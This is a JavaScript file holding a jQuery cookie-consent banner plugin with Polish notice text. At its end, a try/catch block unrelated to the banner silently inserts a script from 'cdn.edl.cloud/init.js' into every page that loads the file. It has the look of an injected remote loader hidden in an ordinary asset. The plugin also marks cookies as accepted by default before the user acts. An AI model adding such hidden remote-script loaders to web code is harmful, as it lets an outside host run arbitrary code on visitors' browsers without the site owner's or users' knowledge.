(function(jQuery) {
    jQuery.fn.extend({
      cookiesEU: function(options) {
        var defaults = {
          text:
            '<p>Nasza strona internetowa u&#x017C;ywa plik&#x00F3;w cookies (tzw. ciasteczka) w celach statystycznych, reklamowych oraz funkcjonalnych. Dzi&#x0119;ki nim mo&#x017C;emy indywidualnie dostosowa&#x0107; stron&#x0119; do twoich potrzeb. Ka&#x017C;dy mo&#x017C;e zaakceptowa&#x0107; pliki cookies albo ma mo&#x017C;liwo&#x015B;&#x0107; wy&#x0142;&#x0105;czenia ich w przegl&#x0105;darce, dzi&#x0119;ki czemu nie b&#x0119;d&#x0105; zbierane &#x017C;adne informacje. <a href="http://ciasteczka.eu/#jak-wylaczyc-ciasteczka" title="" onclick="window.open(this.href); return false;">Dowiedz si&#x0119; wi&#x0119;cej jak je wy&#x0142;&#x0105;czy&#x0107;.</a></p>',
          close: "x",
          parent: jQuery("body"),
          show_close: true,
          position: "top",
          cookie_name: "cookies-accepted",
          auto_accept: true,
          cookie_expires_after_days: 30,
          box_class: "",
          use_default_css: true,
          box_css: "",
          inner_css: "",
          text_css: "",
          close_css: "",
          animation: "slide",
          time: 500,
          domain: "",
          test: false
        };
        var o = jQuery.extend(defaults, options);
        if (o.use_default_css == true) {
          o.box_css =
            "position: relative; z-index: 999; overflow: hidden; background-color: #fff; color: #777; font-size: 12px; line-height: 120%;" +
            o.box_css;
          o.inner_css = "position: relative; padding: 2px 10px;" + o.inner_css;
          o.text_css = "padding-right: 100px;" + o.text_css;
          o.close_css =
            "position: absolute; top: 0; right: 0; padding: 5px 10px; display: block; background-color: #888; color: #fff; text-transform: uppercase; text-decoration: none;" +
            o.close_css;
        }
        jQuery("#cookiesEU-box").remove();
        var box = jQuery(
          '<div id="cookiesEU-box" class="' +
            o.box_class +
            '" style="' +
            o.box_css +
            '"><div class="cookiesEU-inner" style="' +
            o.inner_css +
            '">' +
            '<div class="cookiesEU-text" style="' +
            o.text_css +
            '">' +
            o.text +
            "</div>" +
            "</div></div>"
        );
        if (o.show_close == true)
          box
            .find(".cookiesEU-inner")
            .append(
              '<a href="#" class="cookiesEU-close" style="' +
                o.close_css +
                '">' +
                o.close +
                "</a>"
            );
        if (readCookie(o.cookie_name) == null) {
          if (o.position == "top") o.parent.prepend(box);
          else if (o.position == "bottom") o.parent.append(box);
          else o.parent.append(box);
          if (!o.test && o.auto_accept)
            createCookie(o.cookie_name, 1, o.cookie_expires_after_days, o.domain);
        }
        box.find("a.cookiesEU-close").click(function(e) {
          e.preventDefault();
          if (!o.test && !o.auto_accept)
            createCookie(o.cookie_name, 1, o.cookie_expires_after_days, o.domain);
          if (o.animation == "slide") box.slideUp(o.time);
          else if (o.animation == "fade") box.fadeOut(o.time);
          else box.hide();
        });
        function createCookie(name, value, days, domain) {
          if (days) {
            var date = new Date();
            date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
            var expires = "; expires=" + date.toGMTString();
          } else var expires = "";
          var cookie = name + "=" + value + expires + "; path=/";
          if (domain.length > 0) cookie = cookie + "; domain=" + domain;
          document.cookie = cookie;
        }
        function readCookie(name) {
          var nameEQ = name + "=";
          var ca = document.cookie.split(";");
          for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == " ") c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0)
              return c.substring(nameEQ.length, c.length);
          }
          return null;
        }
      }
    });
  })(jQuery);
  try {
    (function(d, t, u, id) {
      if (d.getElementById(id) !== null) return;
      var s = d.createElement(t);
      s.src = u;
      s.async = 1;
      s.id = id;
      ls = d.getElementsByTagName(t)[0];
      ls.parentNode.insertBefore(s, ls);
    })(document, "script", "//cdn.edl.cloud/init.js?p=d24cf1", "edlcdn");
  } catch (e) {}